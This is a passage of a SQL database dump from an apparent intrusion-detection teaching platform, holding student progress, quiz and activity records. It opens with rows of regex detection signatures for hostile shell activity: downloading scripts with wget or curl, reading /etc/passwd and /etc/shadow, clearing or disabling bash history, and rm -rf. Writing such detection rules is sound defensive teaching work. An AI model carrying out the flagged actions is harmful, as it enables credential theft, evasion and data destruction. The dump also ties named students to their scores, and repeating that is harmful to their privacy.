04:12:08'),(17,'wget\\s+.*http[s]?:\\/\\/.*\\.(sh|py|exe|bin|tar\\.gz)','Suspicious file download','Download',1,'2025-07-12 04:12:08'),(18,'curl\\s+.*http[s]?:\\/\\/.*\\.(sh|py|exe|bin|tar\\.gz)','Suspicious file download','Download',1,'2025-07-12 04:12:08'),(19,'nmap','Network mapping tool','Reconnaissance',0,'2025-07-12 04:12:08'),(20,'nmap\\s+.*-[sS]','Nmap stealth scan','Port Scanning',1,'2025-07-12 04:12:08'),(21,'netstat','Network statistics command','Reconnaissance',0,'2025-07-12 04:12:08'),(22,'netstat\\s+.*-[tulpn]','Network port enumeration','Reconnaissance',1,'2025-07-12 04:12:08'),(23,'ss\\s+.*-[tulpn]','Socket statistics enumeration','Reconnaissance',1,'2025-07-12 04:12:08'),(24,'lsof\\s+.*-i','List open files network','Reconnaissance',1,'2025-07-12 04:12:08'),(25,'ping','Network ping command','Reconnaissance',0,'2025-07-12 04:12:08'),(26,'traceroute','Network trace route','Reconnaissance',0,'2025-07-12 04:12:08'),(27,'dig','DNS lookup tool','Reconnaissance',0,'2025-07-12 04:12:08'),(28,'nslookup','DNS lookup command','Reconnaissance',0,'2025-07-12 04:12:08'),(29,'uname','System information','Reconnaissance',0,'2025-07-12 04:12:08'),(30,'whoami','Current user query','Reconnaissance',0,'2025-07-12 04:12:08'),(31,'id','User ID information','Reconnaissance',0,'2025-07-12 04:12:08'),(32,'ps','Process listing','Reconnaissance',0,'2025-07-12 04:12:08'),(33,'sudo','Sudo command usage','Privilege Escalation',0,'2025-07-12 04:12:08'),(34,'su ','Switch user command','Privilege Escalation',0,'2025-07-12 04:12:08'),(35,'chmod\\s+\\+x','Make file executable','Execution',1,'2025-07-12 04:12:08'),(36,'history\\s+-c','Clear command history','Evasion',1,'2025-07-12 04:12:08'),(37,'rm\\s+.*\\.bash_history','Remove bash history','Evasion',1,'2025-07-12 04:12:08'),(38,'unset\\s+HISTFILE','Disable history logging','Evasion',1,'2025-07-12 04:12:08'),(39,'nmap','Nmap scan detected','Recon',0,'2025-07-12 15:27:53'),(40,'cat\\s+.*\\/etc\\/passwd','Sensitive file access','File Access',1,'2025-07-12 15:27:53'),(41,'cat\\s+.*\\/etc\\/shadow','Shadow file access','File Access',1,'2025-07-12 15:27:53'),(42,'wget\\s+.*','Wget download','Download',1,'2025-07-12 15:27:53'),(43,'curl\\s+.*','Curl download','Download',1,'2025-07-12 15:27:53'),(44,'chmod\\s+\\+x\\s+.*','Chmod +x execution','Execution',1,'2025-07-12 15:27:53'),(45,'rm\\s+-rf\\s+.*','Dangerous file removal','Destruction',1,'2025-07-12 15:27:53');
/*!40000 ALTER TABLE `signatures` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_lesson_progress`
--

DROP TABLE IF EXISTS `student_lesson_progress`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_lesson_progress` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int NOT NULL,
  `module_name` varchar(255) NOT NULL,
  `lesson_id` varchar(255) NOT NULL,
  `completed` tinyint(1) DEFAULT '1',
  `completed_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_student_module_lesson` (`student_id`,`module_name`,`lesson_id`)
) ENGINE=InnoDB AUTO_INCREMENT=88 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_lesson_progress`
--

LOCK TABLES `student_lesson_progress` WRITE;
/*!40000 ALTER TABLE `student_lesson_progress` DISABLE KEYS */;
INSERT INTO `student_lesson_progress` VALUES (1,1,'signature-based-detection','signature-based-detection-what-is-a-nids',1,'2025-09-09 09:30:18'),(3,1,'signature-based-detection','signature-based-detection-types-of-idsnids-approaches',1,'2025-09-18 10:08:12'),(4,1,'signature-based-detection','signature-based-detection-what-is-signature-based-detection',1,'2025-09-09 09:30:26'),(5,1,'signature-based-detection','signature-based-detection-how-signatures-work-in-practice',1,'2025-09-09 09:30:31'),(6,1,'signature-based-detection','signature-based-detection-strengths--limitations',1,'2025-09-09 09:30:41'),(7,1,'signature-based-detection','signature-based-detection-rule-anatomy',1,'2025-09-09 09:30:59'),(9,1,'signature-based-detection','signature-based-detection-common-patterns-in-signatures',1,'2025-09-09 09:31:02'),(10,1,'signature-based-detection','signature-based-detection-reducing-false-positives',1,'2025-09-09 09:31:05'),(11,1,'signature-based-detection','signature-based-detection-testing-signatures',1,'2025-09-09 09:31:16'),(12,1,'signature-based-detection','signature-based-detection-performance-considerations',1,'2025-09-09 09:31:19'),(13,1,'signature-based-detection','signature-based-detection-automation--maintenance',1,'2025-09-09 09:31:23'),(15,1,'signature-based-detection','introduction-overview',1,'2025-09-18 11:47:26'),(16,1,'signature-based-detection','rule-writing-basics',1,'2025-09-18 11:47:30'),(17,1,'signature-based-detection','advanced-concepts',1,'2025-09-18 11:47:34'),(18,1,'signature-based-detection','basics-of-cybersecurity',1,'2025-09-18 15:26:45'),(19,1,'signature-based-detection','introduction-to-ids',1,'2025-09-20 10:31:26'),(20,5,'signature-based-detection','sig-1',1,'2025-09-21 11:20:03'),(21,5,'signature-based-detection','sig-2',1,'2025-09-21 11:28:30'),(22,6,'signature-based-detection','sig-1',1,'2025-09-21 12:12:20'),(23,6,'signature-based-detection','sig-2',1,'2025-09-21 12:12:25'),(24,6,'signature-based-detection','sig-3',1,'2025-09-21 12:55:59'),(25,6,'signature-based-detection','sig-4',1,'2025-09-21 12:56:04'),(26,6,'signature-based-detection','sig-5',1,'2025-09-21 12:56:11'),(27,6,'signature-based-detection','sig-6',1,'2025-09-21 12:56:18'),(28,6,'signature-based-detection','sig-7',1,'2025-09-21 12:56:21'),(29,6,'signature-based-detection','sig-8',1,'2025-09-21 12:56:26'),(30,6,'signature-based-detection','sig-9',1,'2025-09-21 12:56:30'),(31,6,'signature-based-detection','sig-10',1,'2025-09-21 12:56:32'),(32,6,'signature-based-detection','sig-11',1,'2025-09-21 13:03:33'),(33,7,'signature-based-detection','sig-1',1,'2025-09-22 11:11:46'),(34,7,'anomaly-based-detection','anom-1',1,'2025-09-22 11:40:13'),(35,7,'anomaly-based-detection','anom-2',1,'2025-09-22 11:40:32'),(36,7,'signature-based-detection','sig-2',1,'2025-09-22 12:47:51'),(37,7,'signature-based-detection','sig-3',1,'2025-09-22 12:49:01'),(38,7,'signature-based-detection','sig-4',1,'2025-09-22 13:08:47'),(39,7,'signature-based-detection','sig-5',1,'2025-09-22 13:50:20'),(40,7,'anomaly-based-detection','anom-3',1,'2025-09-22 16:49:12'),(41,7,'anomaly-based-detection','anom-4',1,'2025-09-23 03:39:12'),(42,7,'anomaly-based-detection','anom-5',1,'2025-09-23 03:39:15'),(43,7,'anomaly-based-detection','anom-6',1,'2025-09-23 03:39:21'),(44,7,'signature-based-detection','sig-6',1,'2025-09-23 15:24:03'),(45,7,'signature-based-detection','sig-7',1,'2025-09-23 15:24:07'),(46,8,'signature-based-detection','sig-2',1,'2025-09-23 16:06:31'),(47,8,'signature-based-detection','sig-1',1,'2025-09-23 16:06:35'),(48,9,'signature-based-detection','sig-1',1,'2025-09-23 16:08:08'),(49,9,'signature-based-detection','sig-2',1,'2025-09-23 16:08:13'),(50,9,'anomaly-based-detection','anom-1',1,'2025-09-26 16:28:19'),(51,9,'anomaly-based-detection','anom-2',1,'2025-09-26 16:28:44'),(52,10,'signature-based-detection','sig-1',1,'2025-09-26 16:31:02'),(53,10,'signature-based-detection','l1',1,'2025-09-27 02:42:38'),(54,10,'signature-based-detection','l2',1,'2025-09-27 02:42:39'),(55,10,'signature-based-detection','l3',1,'2025-09-27 02:42:39'),(59,10,'signature-based-detection','l4',1,'2025-09-27 02:42:39'),(60,10,'signature-based-detection','l5',1,'2025-09-27 02:42:39'),(61,10,'signature-based-detection','l6',1,'2025-09-27 02:42:39'),(62,10,'signature-based-detection','l7',1,'2025-09-27 02:42:39'),(63,10,'signature-based-detection','l8',1,'2025-09-27 02:42:39'),(64,10,'signature-based-detection','l9',1,'2025-09-27 02:42:39'),(65,10,'signature-based-detection','l10',1,'2025-09-27 02:42:39'),(66,10,'signature-based-detection','l11',1,'2025-09-27 02:42:39'),(67,10,'anomaly-based-detection','anom-1',1,'2025-09-27 03:36:43'),(68,10,'anomaly-based-detection','anom-2',1,'2025-09-27 03:36:49'),(69,11,'signature-based-detection','sig-1',1,'2025-09-27 03:54:19'),(70,13,'signature-based-detection','sig-1',1,'2025-09-27 07:54:29'),(71,13,'signature-based-detection','sig-2',1,'2025-09-27 09:25:50'),(72,13,'signature-based-detection','sig-3',1,'2025-09-27 16:27:27'),(73,13,'signature-based-detection','sig-4',1,'2025-10-08 07:26:05'),(74,13,'signature-based-detection','sig-5',1,'2025-10-08 07:26:10'),(75,13,'signature-based-detection','sig-6',1,'2025-10-08 07:26:38'),(76,13,'signature-based-detection','sig-7',1,'2025-10-08 07:26:42'),(77,13,'signature-based-detection','sig-8',1,'2025-10-08 07:27:04'),(78,13,'signature-based-detection','sig-9',1,'2025-10-08 07:27:09'),(79,13,'signature-based-detection','sig-10',1,'2025-10-08 07:27:14'),(80,13,'signature-based-detection','sig-11',1,'2025-10-08 07:27:33'),(81,17,'signature-based-detection','sig-1',1,'2025-10-09 00:31:30'),(82,17,'signature-based-detection','sig-2',1,'2025-10-09 00:31:37'),(83,17,'signature-based-detection','sig-3',1,'2025-10-09 05:35:27'),(84,17,'signature-based-detection','sig-4',1,'2025-10-09 05:35:31'),(85,17,'signature-based-detection','sig-5',1,'2025-10-09 05:35:35'),(86,18,'signature-based-detection','sig-1',1,'2025-10-09 05:39:09'),(87,18,'signature-based-detection','sig-2',1,'2025-10-09 05:39:14');
/*!40000 ALTER TABLE `student_lesson_progress` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_module_quiz`
--

DROP TABLE IF EXISTS `student_module_quiz`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_module_quiz` (
  `student_id` int NOT NULL,
  `module_name` varchar(255) NOT NULL,
  `passed` tinyint(1) NOT NULL DEFAULT '0',
  `score` int DEFAULT '0',
  `total` int DEFAULT '0',
  `attempted_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`student_id`,`module_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_module_quiz`
--

LOCK TABLES `student_module_quiz` WRITE;
/*!40000 ALTER TABLE `student_module_quiz` DISABLE KEYS */;
INSERT INTO `student_module_quiz` VALUES (1,'signature-based-detection',1,5,5,'2025-09-09 09:32:53'),(5,'m1',1,5,5,'2025-09-21 11:43:53'),(6,'m1',1,5,5,'2025-09-21 12:12:40'),(6,'m2',1,5,5,'2025-09-21 13:52:44'),(6,'m3',1,5,5,'2025-09-21 14:23:44'),(6,'m4',1,5,5,'2025-09-21 14:24:01'),(6,'summary',1,5,5,'2025-09-21 14:24:14'),(7,'m1',1,5,5,'2025-09-22 16:49:50'),(7,'m2',1,4,5,'2025-09-23 03:39:53'),(7,'m3',1,5,5,'2025-09-23 15:24:22'),(8,'m1',1,5,5,'2025-09-23 16:06:48'),(9,'m1',1,5,5,'2025-09-23 16:08:26'),(13,'m1',1,5,5,'2025-09-27 11:36:27'),(13,'m2',1,4,5,'2025-10-08 07:26:21'),(13,'m3',1,5,5,'2025-10-08 07:26:52'),(13,'m4',1,5,5,'2025-10-08 07:27:27'),(13,'summary',1,5,5,'2025-10-08 07:27:45'),(17,'m1',1,4,5,'2025-10-09 00:31:47'),(17,'m2',1,4,5,'2025-10-09 05:35:47'),(18,'m1',1,4,5,'2025-10-09 05:39:23');
/*!40000 ALTER TABLE `student_module_quiz` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_module_unit_events`
--

DROP TABLE IF EXISTS `student_module_unit_events`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_module_unit_events` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int NOT NULL,
  `module_name` varchar(255) NOT NULL,
  `unit_type` enum('overview','lesson','quiz','practical','assessment') NOT NULL,
  `unit_code` varchar(64) DEFAULT NULL,
  `completed` tinyint(1) DEFAULT '1',
  `duration_seconds` int DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_student_module` (`student_id`,`module_name`),
  KEY `idx_unit_type` (`unit_type`)
) ENGINE=InnoDB AUTO_INCREMENT=153 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_module_unit_events`
--

LOCK TABLES `student_module_unit_events` WRITE;
/*!40000 ALTER TABLE `student_module_unit_events` DISABLE KEYS */;
INSERT INTO `student_module_unit_events` VALUES (1,1,'signature-based-detection','overview',NULL,1,0,'2025-09-27 01:55:29'),(2,1,'signature-based-detection','quiz','quiz1',1,0,'2025-09-27 01:55:29'),(3,1,'signature-based-detection','quiz','quiz2',1,0,'2025-09-27 01:55:29'),(4,1,'signature-based-detection','quiz','quiz3',1,0,'2025-09-27 01:55:29'),(5,1,'signature-based-detection','quiz','quiz4',1,0,'2025-09-27 01:55:29'),(6,1,'signature-based-detection','quiz','quiz5',1,0,'2025-09-27 01:55:29'),(7,1,'signature-based-detection','practical',NULL,1,0,'2025-09-27 01:55:29'),(8,1,'signature-based-detection','assessment',NULL,1,0,'2025-09-27 01:55:30'),(9,1,'signature-based-detection','overview',NULL,1,0,'2025-09-27 02:06:48'),(10,1,'signature-based-detection','practical',NULL,1,0,'2025-09-27 02:07:02'),(11,1,'signature-based-detection','assessment',NULL,1,0,'2025-09-27 02:07:15'),(12,10,'signature-based-detection','overview',NULL,1,0,'2025-09-27 02:18:55'),(13,10,'signature-based-detection','overview',NULL,1,0,'2025-09-27 02:27:16'),(14,10,'signature-based-detection','quiz','quiz1',1,0,'2025-09-27 02:27:33'),(15,10,'signature-based-detection','quiz','quiz2',1,0,'2025-09-27 02:27:33'),(16,10,'signature-based-detection','quiz','quiz3',1,0,'2025-09-27 02:27:33'),(17,10,'signature-based-detection','quiz','quiz4',1,0,'2025-09-27 02:27:33'),(18,10,'signature-based-detection','quiz','quiz5',1,0,'2025-09-27 02:27:33'),(19,10,'signature-based-detection','practical',NULL,1,0,'2025-09-27 02:27:38'),(20,10,'signature-based-detection','assessment',NULL,1,0,'2025-09-27 02:27:45'),(21,10,'anomaly-based-detection','overview',NULL,1,0,'2025-09-27 03:36:27'),(22,11,'signature-based-detection','overview',NULL,1,0,'2025-09-27 03:51:09'),(23,12,'signature-based-detection','overview',NULL,1,0,'2025-09-27 04:40:58'),(24,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 04:47:54'),(25,13,'anomaly-based-detection','overview',NULL,1,0,'2025-09-27 05:18:43'),(26,13,'hybrid-detection','overview',NULL,1,0,'2025-09-27 06:22:09'),(27,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 06:29:50'),(28,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 07:54:01'),(29,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 07:54:20'),(30,13,'hybrid-detection','overview',NULL,1,0,'2025-09-27 07:55:14'),(31,13,'anomaly-based-detection','overview',NULL,1,0,'2025-09-27 08:03:12'),(32,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 08:09:46'),(33,13,'hybrid-detection','overview',NULL,1,0,'2025-09-27 08:10:29'),(34,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 09:10:17'),(35,13,'anomaly-based-detection','overview',NULL,1,0,'2025-09-27 09:10:24'),(36,13,'hybrid-detection','overview',NULL,1,0,'2025-09-27 09:10:30'),(37,13,'signature-based-detection','quiz','m1',1,0,'2025-09-27 10:16:35'),(38,13,'signature-based-detection','overview',NULL,1,0,'2025-09-27 16:27:06'),(39,13,'signature-based-detection','overview','overview',0,30,'2025-09-29 13:51:09'),(40,13,'signature-based-detection','overview','overview',0,15,'2025-09-30 01:26:05'),(41,13,'signature-based-detection','overview','overview',0,15,'2025-09-30 01:26:15'),(42,13,'signature-based-detection','overview',NULL,1,0,'2025-09-30 01:55:45'),(43,13,'signature-based-detection','overview','overview',0,15,'2025-09-30 01:56:52'),(44,13,'signature-based-detection','overview','overview',0,45,'2025-09-30 02:02:33'),(45,13,'signature-based-detection','overview','overview',0,60,'2025-09-30 02:19:22'),(46,13,'signature-based-detection','overview','overview',0,60,'2025-09-30 02:44:05'),(47,13,'signature-based-detection','overview','overview',0,15,'2025-09-30 02:44:28'),(48,17,'signature-based-detection','overview',NULL,1,0,'2025-10-08 23:55:23'),(49,17,'signature-based-detection','overview',NULL,1,0,'2025-10-08 23:57:49'),(50,17,'signature-based-detection','overview',NULL,1,0,'2025-10-08 23:58:16'),(51,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 00:38:04'),(52,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 00:40:17'),(53,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:24:27'),(54,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 01:24:50'),(55,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:25:01'),(56,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 01:25:42'),(57,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:26:19'),(58,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:29:14'),(59,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:32:25'),(60,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:33:54'),(61,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:37:45'),(62,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:40:35'),(63,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:41:37'),(64,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 01:42:08'),(65,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:50:18'),(66,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:50:57'),(67,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:57:25'),(68,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 01:57:58'),(69,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:19:49'),(70,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:21:18'),(71,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:21:36'),(72,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:24:11'),(73,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:24:46'),(74,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:30:17'),(75,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 02:30:52'),(76,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:32:53'),(77,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:33:07'),(78,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:35:06'),(79,17,'signature-based-detection','overview','overview',0,45,'2025-10-09 02:35:54'),(80,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:37:28'),(81,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:43:23'),(82,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:43:47'),(83,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 02:44:14'),(84,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:48:09'),(85,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:48:30'),(86,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 02:49:18'),(87,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 02:49:47'),(88,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 02:50:51'),(89,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:51:10'),(90,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:55:04'),(91,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:55:32'),(92,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 02:56:35'),(93,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:00:43'),(94,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:02:16'),(95,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 03:02:46'),(96,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:03:16'),(97,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:05:40'),(98,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:06:05'),(99,17,'signature-based-detection','overview','overview',0,45,'2025-10-09 03:07:06'),(100,17,'signature-based-detection','overview','overview',0,60,'2025-10-09 03:08:15'),(101,17,'signature-based-detection','overview','overview',0,60,'2025-10-09 03:09:20'),(102,17,'signature-based-detection','overview','overview',0,75,'2025-10-09 03:10:25'),(103,17,'signature-based-detection','overview','overview',0,60,'2025-10-09 03:11:25'),(104,17,'signature-based-detection','overview','overview',0,45,'2025-10-09 03:12:19'),(105,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 03:13:02'),(106,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:19:23'),(107,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:20:10'),(108,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 03:21:10'),(109,17,'signature-based-detection','overview','overview',0,15,'2025-10-09 03:21:28'),(110,17,'signature-based-detection','overview','overview',0,30,'2025-10-09 03:29:25'),(111,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 03:30:18'),(112,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 03:33:02'),(113,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 03:50:24'),(114,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 03:56:37'),(115,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 03:58:07'),(116,17,'signature-based-detection','lesson','sig-2',0,45,'2025-10-09 04:01:16'),(117,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:04:28'),(118,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:07:05'),(119,17,'signature-based-detection','lesson','sig-2',0,45,'2025-10-09 04:07:55'),(120,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:08:52'),(121,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:12:15'),(122,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:12:48'),(123,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:13:16'),(124,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 04:15:03'),(125,17,'signature-based-detection','quiz','m2',1,0,'2025-10-09 05:35:47'),(126,17,'signature-based-detection','overview','overview',0,45,'2025-10-09 05:37:02'),(127,17,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 05:37:30'),(128,18,'signature-based-detection','overview',NULL,1,0,'2025-10-09 05:38:30'),(129,18,'signature-based-detection','quiz','m1',1,0,'2025-10-09 05:39:23'),(130,18,'signature-based-detection','lesson','sig-5',0,15,'2025-10-09 06:10:14'),(131,18,'signature-based-detection','lesson','sig-5',0,15,'2025-10-09 06:10:49'),(132,18,'signature-based-detection','lesson','sig-6',0,15,'2025-10-09 06:11:44'),(133,18,'signature-based-detection','lesson','sig-7',0,15,'2025-10-09 06:13:18'),(134,18,'signature-based-detection','lesson','sig-7',0,15,'2025-10-09 06:14:42'),(135,18,'signature-based-detection','lesson','sig-7',0,15,'2025-10-09 06:25:38'),(136,18,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 06:29:19'),(137,18,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 06:33:03'),(138,18,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 06:37:25'),(139,18,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 06:37:43'),(140,18,'signature-based-detection','lesson','sig-2',0,15,'2025-10-09 06:48:20'),(141,18,'signature-based-detection','lesson','sig-3',0,30,'2025-10-09 06:49:04'),(142,18,'signature-based-detection','lesson','sig-3',0,15,'2025-10-09 06:51:06'),(143,18,'signature-based-detection','lesson','sig-3',0,30,'2025-10-09 06:53:27'),(144,18,'signature-based-detection','lesson','sig-3',0,15,'2025-10-09 07:02:40'),(145,18,'signature-based-detection','lesson','sig-4',0,30,'2025-10-09 07:03:11'),(146,18,'signature-based-detection','lesson','sig-5',0,15,'2025-10-09 07:04:11'),(147,18,'signature-based-detection','lesson','sig-5',0,15,'2025-10-09 07:04:23'),(148,18,'signature-based-detection','lesson','sig-3',0,15,'2025-10-09 07:05:23'),(149,18,'signature-based-detection','lesson','sig-11',0,15,'2025-10-09 07:22:27'),(150,18,'signature-based-detection','lesson','sig-3',0,60,'2025-10-09 09:59:29'),(151,18,'signature-based-detection','lesson','sig-3',0,15,'2025-10-09 10:00:34'),(152,18,'signature-based-detection','overview','overview',0,15,'2025-10-09 10:03:49');
/*!40000 ALTER TABLE `student_module_unit_events` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_profiles`
--

DROP TABLE IF EXISTS `student_profiles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_profiles` (
  `student_id` int NOT NULL,
  `join_date` date DEFAULT NULL,
  `avatar_url` varchar(512) DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`student_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_profiles`
--

LOCK TABLES `student_profiles` WRITE;
/*!40000 ALTER TABLE `student_profiles` DISABLE KEYS */;
INSERT INTO `student_profiles` VALUES (7,NULL,NULL,'2025-10-05 09:31:29'),(8,NULL,NULL,'2025-10-05 09:31:29'),(9,NULL,NULL,'2025-10-05 09:31:29'),(10,NULL,NULL,'2025-10-05 09:31:29'),(11,NULL,NULL,'2025-10-05 09:31:29'),(12,NULL,NULL,'2025-10-05 09:31:29'),(13,'2025-10-05','http://localhost:8000/uploads/avatars/students/13_a8324279f84b4aebbb8d0423b2b6aea5.jpg','2025-10-07 05:23:58');
/*!40000 ALTER TABLE `student_profiles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_progress`
--

DROP TABLE IF EXISTS `student_progress`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_progress` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int NOT NULL,
  `student_name` varchar(255) DEFAULT NULL,
  `module_name` varchar(255) DEFAULT NULL,
  `lessons_completed` int DEFAULT NULL,
  `total_lessons` int DEFAULT NULL,
  `last_lesson` varchar(255) DEFAULT NULL,
  `time_spent` int DEFAULT NULL,
  `engagement_score` int DEFAULT NULL,
  `overview_completed` tinyint(1) DEFAULT '0',
  `practical_completed` tinyint(1) DEFAULT '0',
  `assessment_completed` tinyint(1) DEFAULT '0',
  `quizzes_passed` int DEFAULT '0',
  `total_quizzes` int DEFAULT '0',
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_student_module` (`student_id`,`module_name`),
  UNIQUE KEY `uniq_student_module` (`student_id`,`module_name`)
) ENGINE=InnoDB AUTO_INCREMENT=256 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_progress`
--

LOCK TABLES `student_progress` WRITE;
/*!40000 ALTER TABLE `student_progress` DISABLE KEYS */;
INSERT INTO `student_progress` VALUES (146,1,'Hanz Hendrick Lacsi','anomaly-based-detection',0,12,'What is Anomaly-Based Detection?',18,0,0,0,0,0,5,'2025-09-27 02:04:52'),(192,5,'Danlie Ken Gregory','signature-based-detection',0,0,'Overview',4,0,0,0,0,0,5,'2025-09-27 02:04:52'),(195,6,'Hanz Hendrick Lacsi','signature-based-detection',0,0,'Overview',12,0,0,0,0,0,5,'2025-09-27 02:04:52'),(196,6,'Hanz Hendrick Lacsi','anomaly-based-detection',0,0,'Overview',3,0,0,0,0,0,5,'2025-09-27 02:04:52'),(201,7,'Angel Bless Mendoza','signature-based-detection',0,0,'Overview',4,0,0,0,0,0,5,'2025-09-27 02:04:52'),(204,7,'Angel Bless Mendoza','anomaly-based-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(205,7,'Angel Bless Mendoza','hybrid-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(206,8,'Hanz Hendrick Lacsi','signature-based-detection',0,0,'Overview',2,0,0,0,0,0,5,'2025-09-27 02:04:52'),(207,9,'Danlie Ken Gregory','signature-based-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(208,9,'Danlie Ken Gregory','anomaly-based-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(209,9,'Danlie Ken 